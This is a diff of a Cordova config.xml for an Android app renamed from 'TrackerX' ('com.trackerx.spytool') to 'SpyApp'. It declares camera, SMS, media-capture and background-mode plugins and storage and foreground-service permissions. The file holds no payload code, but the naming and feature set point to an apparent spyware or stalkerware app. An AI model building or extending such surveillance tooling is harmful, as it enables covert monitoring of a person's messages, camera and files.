@@ -1,31 +1,18 @@
-<?xml version='1.0' encoding='utf-8'?>
-<widget id="com.trackerx.spytool" version="1.0.0"
-        xmlns="http://www.w3.org/ns/widgets"
-        xmlns:cdv="http://cordova.apache.org/ns/1.0">
-    
-    <!-- ✅ اسم التطبيق -->
-    <name>TrackerX</name>
 
-    <!-- ✅ الصفحة الرئيسية -->
+<?xml version='1.0' encoding='utf-8'?>
+<widget id="com.spyapp.spy" version="1.0.1" xmlns="http://www.w3.org/ns/widgets" xmlns:cdv="http://cordova.apache.org/ns/1.0">
+    <name>SpyApp</name>
     <content src="index.html" />
     <access origin="*" />
-
-    <!-- ✅ النوايا (intents) المسموحة -->
     <allow-intent href="http://*/*" />
     <allow-intent href="https://*/*" />
     <allow-intent href="tel:*" />
     <allow-intent href="sms:*" />
     <allow-intent href="mailto:*" />
     <allow-intent href="geo:*" />
-
-    <!-- ✅ تفعيل وضع الخلفية -->
-    <preference name="BackgroundModeEnabled" value="true" />
-    <preference name="BackgroundModeSilent" value="false" />
-
-    <!-- ✅ تحديد إصدار SDK -->
     <preference name="android-targetSdkVersion" value="34" />
 
-    <!-- ✅ الإضافات المطلوبة -->
+    <!-- الإضافات (Plugins) -->
     <plugin name="cordova-plugin-camera" />
     <plugin name="cordova-plugin-sms" />
     <plugin name="cordova-plugin-media-capture" />
@@ -37,10 +24,7 @@
     <plugin name="cordova-plugin-media" />
     <plugin name="cordova-plugin-background-mode" />
 
-    <!-- ✅ إعدادات منصة Android -->
     <platform name="android">
-
-        <!-- ✅ الأذونات -->
         <edit-config file="app/src/main/AndroidManifest.xml" mode="merge" target="/manifest">
             <manifest xmlns:android="http://schemas.android.com/apk/res/android">
                 <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
@@ -55,11 +39,5 @@
                 <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
             </manifest>
         </edit-config>
-
-        <!-- ✅ إصلاح usesCleartextTraffic بدون android: -->
-        <edit-config file="app/src/main/AndroidManifest.xml" mode="merge" target="/manifest/application">
-            <application usesCleartextTraffic="true" />
-        </edit-config>
-
     </platform>
 </widget>
